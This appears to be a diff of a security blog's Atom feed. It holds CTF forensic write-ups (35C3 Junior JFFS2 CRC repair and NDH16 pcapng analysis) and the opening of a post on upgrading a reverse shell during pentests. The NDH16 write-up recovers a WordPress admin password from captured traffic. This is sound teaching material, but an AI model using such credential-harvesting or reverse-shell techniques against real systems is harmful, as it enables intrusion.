+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mtd_crc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[:&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;node_crc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+            &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;node_crc_match&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'hdr_crc does not match!'&lt;/span&gt;
+    &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;node_crc_match&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Header CRCs seem to be broken so we added the following two lines to the else clause:&lt;/p&gt;
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'now : '&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;node_crc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'should be : '&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mtd_crc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[:&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;That way, we could manually fix the broken CRCs using an Hex editor. It looked good on the paper but it didn’t gave us the flag…&lt;/p&gt;
+
+&lt;p&gt;Then, we remembered the challenge statement evocating some stego and we decided to dump the headers for which the CRC was wrong. We did this by adding the following print statement to jefferson’s code:&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[:&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;From this dump, we can reconstruct the flag by extracting one byte of each line:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@kali:~/CTF/2018/35C3-Junior/For&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;dump_chall2.txt
+D-0o3&lt;span class=&quot;se&quot;&gt;\\\&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;-5&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\\@&lt;/span&gt;
+D-0C&lt;span class=&quot;se&quot;&gt;\\\p&lt;/span&gt;
+D-0o
+    3&lt;span class=&quot;se&quot;&gt;\\\&lt;/span&gt;
+D-0o_&lt;span class=&quot;se&quot;&gt;\\\P&lt;/span&gt;
+D-0o&lt;span class=&quot;s1&quot;&gt;'h\\\P
+D-0o+i\\\
+Bd\\\L
+D-0ove\\\
+D-0o_\\\
+D-0om\\\
+D-0oe\\\
+D-0o_\\\        @
+D-0ob\\\        p
+D-0oa\\\
+
+D-0ob\\\
+
+D-0oy\\\
+
+D-0o_\\\
+D-0o\\\
+D-0on\\\@
+D-0oMe\\\
+D-0oN_\\\
+D-0o:m\\\P
+@@vCo\\\Q@
+;.\r\\\U0
+D-0oe\\\U
+D-0o_\\\X
+jUt\\\Zp
+D-0oi\\\\0
+-Cm\\\]
+@@ie\\\
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Flag: &lt;code class=&quot;highlighter-rouge&quot;&gt;35C3_hide_me_baby_one_more_time&lt;/code&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;junior-ctf-forensic---legendary_mount&quot;&gt;[Junior CTF] Forensic - legendary_mount&lt;/h2&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Something’s horribly broken. :(&lt;/p&gt;
+
+  &lt;p&gt;FS&lt;/p&gt;
+
+  &lt;p&gt;Difficulty estimate: Medium&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Running &lt;code class=&quot;highlighter-rouge&quot;&gt;jefferson&lt;/code&gt; doesn’t reveal anything apart from the same troll video as for the two previous challenges. The challenge statement suggests that &lt;strong&gt;something is corrupted&lt;/strong&gt; so followed this track.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;strings&lt;/code&gt; shows a few interesting strings like “ROFL”, “rofl” and “/secret/flag” so we decided to examine this file with an hex editor.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;http://www.inf.u-szeged.hu/projectdirs/jffs2/jffs2-anal/jffs2-anal.html&quot;&gt;This resource&lt;/a&gt; was very helpful for understanding the file structure.&lt;/p&gt;
+
+&lt;p&gt;Using the hex editor, we can see &lt;strong&gt;a corrupted file&lt;/strong&gt; located at the end.
+With the same technique we used during epic_mount for printing the corrupted bytes, we managed to fix several &lt;strong&gt;hdr_crc&lt;/strong&gt;, &lt;strong&gt;node_crc&lt;/strong&gt;, &lt;strong&gt;data_crc&lt;/strong&gt; and a &lt;strong&gt;zlib header&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;The following two screen captures show the before/after with all of our corrections.&lt;/p&gt;
+
+&lt;p&gt;BEFORE:
+&lt;img src=&quot;http://localhost:4000/assets/2018-12-30/chall3_original.png&quot; alt=&quot;Before&quot; title=&quot;Before&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;AFTER:
+&lt;img src=&quot;http://localhost:4000/assets/2018-12-30/chall3_fixed.png&quot; alt=&quot;After&quot; title=&quot;After&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Then, we ran &lt;code class=&quot;highlighter-rouge&quot;&gt;jefferson&lt;/code&gt; which gave us a file containing the flag!&lt;/p&gt;
+
+&lt;p&gt;Flag &lt;code class=&quot;highlighter-rouge&quot;&gt;35C3_mama_what_happend_to_my_honda_CR-C&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Congratulations again to &lt;strong&gt;suchro&lt;/strong&gt; for theses forensic challenges!&lt;/p&gt;
+
+&lt;p id=&quot;signature&quot;&gt;BoiteAKlou :hammer:&lt;/p&gt;</content><author><name>BoiteAKlou</name></author><summary type="html">This weekend was held the 35th Chaos Communication Congress (35C3) as long as its excellent CTF. Hopefully, a Junior CTF was also proposed, which was way more accessible than the main CTF (at least for me :wink:). In this post, you’ll find concise writeups of most of the challenges my team and I solved from both CTFs.</summary></entry><entry><title type="html">Upgrading to a fully interactive reverse shell</title><link href="http://localhost:4000/Fully-interactive-reverse-shell.html" rel="alternate" type="text/html" title="Upgrading to a fully interactive reverse shell" /><published>2018-12-27T10:00:00+01:00</published><updated>2018-12-27T10:00:00+01:00</updated><id>http://localhost:4000/Fully-interactive-reverse-shell</id><content type="html" xml:base="http://localhost:4000/Fully-interactive-reverse-shell.html">&lt;p&gt;Let’s say you’re in the middle of a hacking challenge or pentesting assessment and you finally manage to get a &lt;strong&gt;reverse shell&lt;/strong&gt; on your target. This short article will explain you how to obtain &lt;span style=&quot;color:Green&quot;&gt;a fully interactive version of your reverse shell&lt;/span&gt;, that will allow commands like &lt;code class=&quot;highlighter-rouge&quot;&gt;su&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;vi&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;nano&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt;, etc… but also &lt;strong&gt;CTRL+C&lt;/strong&gt; and &lt;strong&gt;tab completion&lt;/strong&gt;.
  &lt;!--excerpt--&gt;&lt;/p&gt;
 
 &lt;h2 class=&quot;no_toc&quot; id=&quot;table-of-contents&quot;&gt;Table of Contents&lt;/h2&gt;
@@ -2049,94 +2630,4 @@ NAME
       ping - send ICMP ECHO_REQUEST to network hosts
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p id=&quot;signature&quot;&gt;BoiteAKlou :hammer:&lt;/p&gt;</content><author><name>BoiteAKlou</name></author><summary type="html">An interesting forensic challenge covering a famous method of data exfiltration…</summary></entry><entry><title type="html">PCAPNG Forensics: Decode - NDH16</title><link href="http://localhost:4000/PCAPNG-Forensics-NDH-Decode.html" rel="alternate" type="text/html" title="PCAPNG Forensics: Decode - NDH16" /><published>2018-07-01T18:00:00+02:00</published><updated>2018-07-01T18:00:00+02:00</updated><id>http://localhost:4000/PCAPNG-Forensics-NDH-Decode</id><content type="html" xml:base="http://localhost:4000/PCAPNG-Forensics-NDH-Decode.html">&lt;p&gt;A warm-up forensic challenge proposed by NDH16…
- &lt;!--excerpt--&gt;&lt;/p&gt;
-
-&lt;h1 class=&quot;no_toc&quot; id=&quot;table-of-contents&quot;&gt;Table of Contents&lt;/h1&gt;
-
-&lt;ul id=&quot;markdown-toc&quot;&gt;
-  &lt;li&gt;&lt;a href=&quot;#challenge-description&quot; id=&quot;markdown-toc-challenge-description&quot;&gt;Challenge description&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#wiresharks-power&quot; id=&quot;markdown-toc-wiresharks-power&quot;&gt;Wireshark’s power&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#what-about-the-zip&quot; id=&quot;markdown-toc-what-about-the-zip&quot;&gt;What about the zip?&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h2 id=&quot;challenge-description&quot;&gt;Challenge description&lt;/h2&gt;
-&lt;p&gt;We are given &lt;a href=&quot;/assets/2018-07-01/decode.pcapng&quot;&gt;a packet capture&lt;/a&gt; and &lt;a href=&quot;.assets/2018-07-01/Decode_.zip&quot;&gt;a zip archive&lt;/a&gt; which have to be investigated.&lt;/p&gt;
-
-&lt;h2 id=&quot;wiresharks-power&quot;&gt;Wireshark’s power&lt;/h2&gt;
-&lt;p&gt;Let’s open this packet capture with Wireshark, it’s simply one of the best and easiest-to-use tool for analyzing network captures.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-07-01/wireshark.png&quot; alt=&quot;Wireshark screen capture&quot; title=&quot;Wireshark&quot; width=&quot;80%&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Each request is sent to localhost (127.0.0.1) so this capture probably shows interactions between the client and the local  in-development server.&lt;/p&gt;
-
-&lt;p&gt;We can see that &lt;strong&gt;HTTP&lt;/strong&gt; is used over &lt;strong&gt;TCP&lt;/strong&gt; so the best thing to do is to use the &lt;em&gt;“Follow HTTP stream”&lt;/em&gt; option in order to undesrtand the nature of the resquets shown here.&lt;/p&gt;
-
-&lt;p&gt;The GET request at destination of &lt;strong&gt;/wp-login.php&lt;/strong&gt; indicates us that we are dealing with a &lt;strong&gt;wordpress&lt;/strong&gt; site. The next HTTP POST request seems very interesting because it should contain the authentication parameters of the website’s administrator.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-07-01/httpstream.png&quot; alt=&quot;HTTP stream screen capture&quot; title=&quot;HTTP stream&quot; width=&quot;80%&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Indeed, we see the following admin credentials in the request parameters.&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;log=decode&amp;amp;pwd=95%2F%40Jywf5R%40666
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;This password gives &lt;strong&gt;95/@Jywf5R@666&lt;/strong&gt; once URL-decoded.
-However, the challenge is not over since we don’t have the flag yet…&lt;/p&gt;
-
-&lt;h2 id=&quot;what-about-the-zip&quot;&gt;What about the zip?&lt;/h2&gt;
-
-&lt;p&gt;When trying to unzip the given archive, we face the following error:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;unzip Decode_.zip
-Archive:  Decode_.zip
-   skipping: Decode_/Decode0         need PK compat. v5.1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;can &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;v4.6&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-   creating: Decode_/
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;It looks like we need another tool to extract the content of this zip. &lt;strong&gt;7z&lt;/strong&gt; should be fine.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;7z e Decode_.zip
-
-7-Zip &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;64] 16.02 : Copyright &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 1999-2016 Igor Pavlov : 2016-05-21
-p7zip Version 16.02 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;locale&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;C.UTF-8,Utf16&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;on,HugeFiles&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;on,64 bits,4 CPUs Intel&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;R&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Core&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;TM&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; i5-6200U CPU @ 2.30GHz &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;406E3&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,ASM,AES-NI&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-
-Scanning the drive &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;archives:
-1 file, 366 bytes &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 KiB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-
-Extracting archive: Decode_.zip
-&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;
-Path &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; Decode_.zip
-Type &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; zip
-Physical Size &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 366
-
-
-Enter password &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;will not be echoed&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;We’re so lucky to have found a password in the pcapng capture! Let’s try it!&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Enter password &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;will not be echoed&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:
-Everything is Ok        
-
-Folders: 1
-Files: 1
-Size:       442
-Compressed: 366
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;The file “Decode0” is extracted. What does it contain?&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;Decode0
-01101110 01100100 01101000 00110001 00110110 01011111 01100011 01100010 01100110 01100011 01100101 00110101 01100101 00110011 00110110 01100100 01100100 00110011 00110011 01100011 00110110 01100001 01100100 01100011 01100101 00110011 00110010 01100001 00110110 01100010 00110101 00110111 00110111 01100010 01100101 00110001 00110110 00110001 01100010 00111001 00111000 00110001 00110101 00111000 00111001 00110011 00100000 00100000 00101101
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;This little one-liner removes spaces in the binary flow and convert it to ASCII:&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@kali:~$ sed -e &quot;s/ //g&quot; &amp;lt; Decode0 |perl -lpe '$_=pack&quot;B*&quot;,$_'
-ndh16_cbfce5e36dd33c6adce32a6b577be161b9815893  -
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;The job is done! :triangular_flag_on_post:&lt;/p&gt;
-
-&lt;p id=&quot;signature&quot;&gt;BoiteAKlou :hammer:&lt;/p&gt;</content><author><name>BoiteAKlou</name></author><summary type="html">A warm-up forensic challenge proposed by NDH16…</summary></entry></feed>
+&lt;p id=&quot;signature&quot;&gt;BoiteAKlou :hammer:&lt;/p&gt;</content><author><name>BoiteAKlou</name></author><summary type="html">An interesting forensic challenge covering a famous method of data exfiltration…</summary></entry></feed>
